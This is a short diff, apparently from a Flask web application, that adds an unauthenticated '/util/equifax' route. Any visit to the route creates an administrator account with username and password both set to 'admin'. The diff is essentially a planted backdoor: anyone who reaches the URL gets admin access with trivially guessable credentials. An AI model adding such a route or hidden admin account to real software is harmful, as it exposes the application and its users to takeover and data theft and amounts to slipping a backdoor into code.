@@ -151,3 +151,13 @@ def niccage():
     db.session.commit()
 
     return "done"
+
+
+@app.route('/util/equifax')
+def equifax():
+    u = models.User(username='admin',
+                    password=passwordHash('admin'),
+                    is_admin=True)
+    db.session.add(u)
+    db.session.commit()
+    return "done :)"
